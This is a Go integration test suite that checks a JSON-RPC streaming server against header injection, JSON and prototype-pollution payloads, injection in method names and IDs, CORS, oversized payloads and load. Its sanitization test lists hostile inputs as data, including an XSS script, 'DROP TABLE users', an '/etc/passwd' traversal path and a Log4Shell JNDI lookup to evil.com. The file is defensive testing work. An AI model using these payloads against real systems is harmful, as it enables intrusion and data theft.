package integration

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"

	"streaming-server/pkg/types"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestSecurity_HeaderInjection tests for header injection vulnerabilities
func (suite *IntegrationTestSuite) TestSecurity_HeaderInjection() {
	// Test with malicious headers that contain newlines
	maliciousHeaders := []struct {
		name  string
		value string
	}{
		{"X-Forwarded-For", "127.0.0.1\r\nX-Malicious: true"},
		{"User-Agent", "Mozilla/5.0\r\nX-Malicious: true"},
		{"Content-Type", "application/json\r\nX-Malicious: true"},
	}

	for i, header := range maliciousHeaders {
		suite.Run(fmt.Sprintf("MaliciousHeader_%d", i), func() {
			request := types.JSONRPCRequest{
				JSONRPC: "2.0",
				Method:  "echo",
				Params:  json.RawMessage(`{"message": "test"}`),
				ID:      fmt.Sprintf("security-test-%d", i),
			}

			jsonData, err := json.Marshal(request)
			require.NoError(suite.T(), err)

			req, err := http.NewRequest("POST", suite.env.BaseURL+"/rpc", bytes.NewBuffer(jsonData))
			require.NoError(suite.T(), err)

			// Try to set malicious header - Go's HTTP client should reject this
			req.Header.Set(header.name, header.value)

			resp, err := suite.httpClient.Do(req)

			// Go's HTTP client prevents header injection by rejecting invalid headers
			// This is actually good security behavior
			if err != nil {
				// Expected: Go rejects the malicious header
				assert.Contains(suite.T(), err.Error(), "invalid header field value")
			} else {
				// If the request succeeds, ensure no malicious header was injected
				defer resp.Body.Close()
				assert.Equal(suite.T(), http.StatusOK, resp.StatusCode)
				assert.Empty(suite.T(), resp.Header.Get("X-Malicious"))
			}
		})
	}
}

// TestSecurity_JSONInjection tests for JSON injection vulnerabilities
func (suite *IntegrationTestSuite) TestSecurity_JSONInjection() {
	// Test with malicious JSON payloads
	maliciousPayloads := []string{
		`{"message": "test\", \"malicious\": true"}`,
		`{"message": "test", "__proto__": {"polluted": true}}`,
		`{"message": "test", "constructor": {"prototype": {"polluted": true}}}`,
	}

	for i, payload := range maliciousPayloads {
		suite.Run(fmt.Sprintf("MaliciousJSON_%d", i), func() {
			request := types.JSONRPCRequest{
				JSONRPC: "2.0",
				Method:  "echo",
				Params:  json.RawMessage(payload),
				ID:      fmt.Sprintf("security-test-%d", i),
			}

			response := suite.makeHTTPRequest(request)

			// Server should still process the request
			assert.Nil(suite.T(), response.Error)
			assert.NotNil(suite.T(), response.Result)

			// The response should contain the echo field
			result, ok := response.Result.(map[string]interface{})
			require.True(suite.T(), ok)
			assert.Contains(suite.T(), result, "echo")
		})
	}
}

// TestSecurity_MethodInjection tests for method injection vulnerabilities
func (suite *IntegrationTestSuite) TestSecurity_MethodInjection() {
	// Test with malicious method names
	maliciousMethods := []string{
		"echo; DROP TABLE users",
		"echo\"; DROP TABLE users; --",
		"__proto__",
		"constructor",
	}

	for i, method := range maliciousMethods {
		suite.Run(fmt.Sprintf("MaliciousMethod_%d", i), func() {
			request := types.JSONRPCRequest{
				JSONRPC: "2.0",
				Method:  method,
				Params:  json.RawMessage(`{"message": "test"}`),
				ID:      fmt.Sprintf("security-test-%d", i),
			}

			response := suite.makeHTTPRequest(request)

			// Server should reject the request with method not found
			assert.NotNil(suite.T(), response.Error)
			assert.Equal(suite.T(), -32601, response.Error.Code)
			assert.Equal(suite.T(), "Method not found", response.Error.Message)
		})
	}
}

// TestSecurity_IDInjection tests for ID injection vulnerabilities
func (suite *IntegrationTestSuite) TestSecurity_IDInjection() {
	// Test with malicious ID values
	maliciousIDs := []interface{}{
		"id\"; DROP TABLE users; --",
		map[string]interface{}{"malicious": true},
		[]interface{}{"malicious", "array"},
	}

	for i, id := range maliciousIDs {
		suite.Run(fmt.Sprintf("MaliciousID_%d", i), func() {
			request := types.JSONRPCRequest{
				JSONRPC: "2.0",
				Method:  "echo",
				Params:  json.RawMessage(`{"message": "test"}`),
				ID:      id,
			}

			response := suite.makeHTTPRequest(request)

			// Server should still process the request
			assert.Nil(suite.T(), response.Error)
			assert.NotNil(suite.T(), response.Result)

			// The response ID should match the request ID
			assert.Equal(suite.T(), id, response.ID)
		})
	}
}

// TestSecurity_CORS tests CORS headers
func (suite *IntegrationTestSuite) TestSecurity_CORS() {
	// Test CORS preflight request
	req, err := http.NewRequest("OPTIONS", suite.env.BaseURL+"/rpc", nil)
	require.NoError(suite.T(), err)
	req.Header.Set("Origin", "https://example.com")
	req.Header.Set("Access-Control-Request-Method", "POST")
	req.Header.Set("Access-Control-Request-Headers", "Content-Type")

	resp, err := suite.httpClient.Do(req)
	require.NoError(suite.T(), err)
	defer resp.Body.Close()

	// Check CORS headers
	// Note: This test may fail if CORS is not configured in the server
	// In a real application, you would want to ensure proper CORS headers are set
	if resp.Header.Get("Access-Control-Allow-Origin") != "" {
		assert.Contains(suite.T(), resp.Header.Get("Access-Control-Allow-Origin"), "*")
		assert.Contains(suite.T(), resp.Header.Get("Access-Control-Allow-Methods"), "POST")
		assert.Contains(suite.T(), resp.Header.Get("Access-Control-Allow-Headers"), "Content-Type")
	}
}

// TestSecurity_PayloadSize tests for payload size limits
func (suite *IntegrationTestSuite) TestSecurity_PayloadSize() {
	// Test with extremely large payload
	largeMessage := strings.Repeat("A", 10*1024*1024) // 10MB

	request := types.JSONRPCRequest{
		JSONRPC: "2.0",
		Method:  "echo",
		Params:  json.RawMessage(fmt.Sprintf(`{"message": "%s"}`, largeMessage)),
		ID:      "large-payload-test",
	}

	jsonData, err := json.Marshal(request)
	require.NoError(suite.T(), err)

	req, err := http.NewRequest("POST", suite.env.BaseURL+"/rpc", bytes.NewBuffer(jsonData))
	require.NoError(suite.T(), err)
	req.Header.Set("Content-Type", "application/json")

	resp, err := suite.httpClient.Do(req)

	// Server should either handle it gracefully or reject it
	if err != nil {
		// Connection might be rejected due to size limits
		assert.Contains(suite.T(), err.Error(), "connection")
	} else {
		defer resp.Body.Close()
		// If accepted, should return a valid response
		assert.True(suite.T(), resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusRequestEntityTooLarge)
	}
}

// TestSecurity_RateLimiting tests basic rate limiting behavior
func (suite *IntegrationTestSuite) TestSecurity_RateLimiting() {
	// Send multiple rapid requests to test rate limiting
	const numRequests = 50
	const concurrency = 10

	results := make(chan bool, numRequests)

	for i := 0; i < concurrency; i++ {
		go func() {
			for j := 0; j < numRequests/concurrency; j++ {
				request := types.JSONRPCRequest{
					JSONRPC: "2.0",
					Method:  "echo",
					Params:  json.RawMessage(`{"message": "rate-limit-test"}`),
					ID:      fmt.Sprintf("rate-limit-%d", j),
				}

				response := suite.makeHTTPRequest(request)
				results <- response.Error == nil
			}
		}()
	}

	successCount := 0
	for i := 0; i < numRequests; i++ {
		if <-results {
			successCount++
		}
	}

	// Most requests should succeed (server should handle reasonable load)
	// This is more of a load test than a security test
	assert.Greater(suite.T(), successCount, numRequests/2)
}

// TestSecurity_InputSanitization tests input sanitization
func (suite *IntegrationTestSuite) TestSecurity_InputSanitization() {
	// Test with various potentially dangerous inputs
	dangerousInputs := []string{
		"<script>alert('xss')</script>",
		"'; DROP TABLE users; --",
		"../../../etc/passwd",
		"${jndi:ldap://evil.com/a}",
		"{{7*7}}",
		"<%=7*7%>",
	}

	for i, input := range dangerousInputs {
		suite.Run(fmt.Sprintf("DangerousInput_%d", i), func() {
			request := types.JSONRPCRequest{
				JSONRPC: "2.0",
				Method:  "echo",
				Params:  json.RawMessage(fmt.Sprintf(`{"message": "%s"}`, input)),
				ID:      fmt.Sprintf("sanitization-test-%d", i),
			}

			response := suite.makeHTTPRequest(request)

			// Server should process the request without executing the dangerous input
			assert.Nil(suite.T(), response.Error)
			assert.NotNil(suite.T(), response.Result)

			// The response should contain the echo field with the original input
			result, ok := response.Result.(map[string]interface{})
			require.True(suite.T(), ok)

			echo, ok := result["echo"].(map[string]interface{})
			require.True(suite.T(), ok)

			// The message should be returned as-is (not executed)
			assert.Equal(suite.T(), input, echo["message"])
		})
	}
}
